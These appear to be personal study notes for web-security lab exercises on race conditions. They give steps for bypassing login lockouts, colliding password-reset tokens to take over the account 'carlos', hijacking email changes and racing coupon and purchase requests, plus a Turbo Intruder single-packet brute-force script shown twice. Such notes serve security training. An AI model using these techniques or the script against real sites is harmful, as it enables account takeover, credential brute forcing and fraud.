```
Failing password 3 times blocks user, but not session, you can try other users
-> Count of request to block user could be server side controlled
-> Send the group of requests again, but this time in parallel. 
-> For details on how to do this, see [Sending requests in parallel]
-> Study the responses. Notice that although you have triggered the account lock, more than three requests received the normal `Invalid username and password` response.
-> Use Turbo Intruder Extension (examples/race-single-packet-attack.py) with the following template and copy to to your clipboard the passwords:


def queueRequests(target, wordlists):
    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )  
    # assign the list of candidate passwords from your clipboard
    passwords = wordlists.clipboard 
    # queue a login request using each password from the wordlist
    # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
    for password in passwords:
        engine.queue(target.req, password, gate='1')
    # once every request has been queued
    # invoke engine.openGate() to send all requests in the given gate simultaneously
    engine.openGate('1')


def handleResponse(req, interesting):
    table.add(req)


Change Your email to the one of other user:
carlos@ginandjuice.shop
-> Send in paralel two requests, the first with carlos mail, the second with yours, recieve the mail in your server


Try obtaining reset token of carlos:
-> GET /forgot-password without cookies, copy csrf and cookie to one POST /forgot-password request and change user to carlos
-> In other Post /forgot-password with new cookie and csrf
-> Send group in parallel till a collision appears and you are assigned the same token as carlos (blind, you have to test the link)

```



To identify:
- Try seeing if the condition is attached to a session for example, there may be a time lapse between the client submit and the server actually committing the action. Or the lock is applied per user not session

To exploit:
- Try applying coupons in group (send in parallel)
- If a delay is noticed in a response, try racing the expensive item having a cheaper one. Add Item + purchase requests in parallel
- Try 2 requests to see if you can recieve the code of an arbitrary mail. You mail server + arbitrary mail in parallel
![[Pasted image 20240209230831.png]]
- Try seeing if php cookies are set on forgot password for example, send two change password requests, one with the cookie and csrf of null session. If you get same token on the email you found a collision that takes only a timestamp but not user, change the username to carlos on the first request and send again in parallel, copy your link and change the user to carlos to access his password reset link.
- Brute Force with Turbo Intruder Extension
Turbo Intruder template, takes wordlist from clipboard
```python
def queueRequests(target, wordlists):
    # as the target supports HTTP/2, use engine=Engine.BURP2 and concurrentConnections=1 for a single-packet attack
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )  
    # assign the list of candidate passwords from your clipboard
    passwords = wordlists.clipboard 
    # queue a login request using each password from the wordlist
    # the 'gate' argument withholds the final part of each request until engine.openGate() is invoked
    for password in passwords:
        engine.queue(target.req, password, gate='1')
    # once every request has been queued
    # invoke engine.openGate() to send all requests in the given gate simultaneously
    engine.openGate('1')


def handleResponse(req, interesting):
    table.add(req)
```

